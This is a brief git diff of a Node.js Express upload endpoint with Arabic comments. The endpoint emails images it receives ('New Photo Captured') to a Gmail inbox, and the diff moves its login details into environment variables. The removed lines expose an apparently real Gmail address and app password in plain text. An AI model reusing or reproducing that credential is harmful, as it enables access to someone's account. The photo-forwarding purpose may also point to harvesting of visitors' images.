@@ -8,19 +8,19 @@ app.use(bodyParser.json({ limit: '10mb' }));
 app.post('/upload', async (req, res) => {
   const image = req.body.image;
 
-  // إعداد ناقل البريد الإلكتروني
+  // إعداد ناقل البريد الإلكتروني باستخدام متغيرات البيئة
   let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'gmedo233@gmail.com',       // غيرها لبريدك
-      pass: 'hijgdljghgnezuwh'           // استخدم "App Password"
+      user: process.env.GMAIL_USER,       // استبدل بالقيمة من متغيرات البيئة
+      pass: process.env.GMAIL_PASS        // استبدل بالقيمة من متغيرات البيئة
     }
   });
 
   // إعداد رسالة البريد
   let mailOptions = {
-    from: 'gmedo233@gmail.com',
-    to: 'gmedo233@gmail.com',
+    from: process.env.GMAIL_USER,
+    to: process.env.GMAIL_USER,
     subject: 'New Photo Captured',
     html: '<p>Attached image from site.</p>',
     attachments: [{
@@ -30,7 +30,6 @@ app.post('/upload', async (req, res) => {
     }]
   };
 
-  // إرسال البريد ومحاولة الرد على العميل
   try {
     await transporter.sendMail(mailOptions);
     res.sendStatus(200);
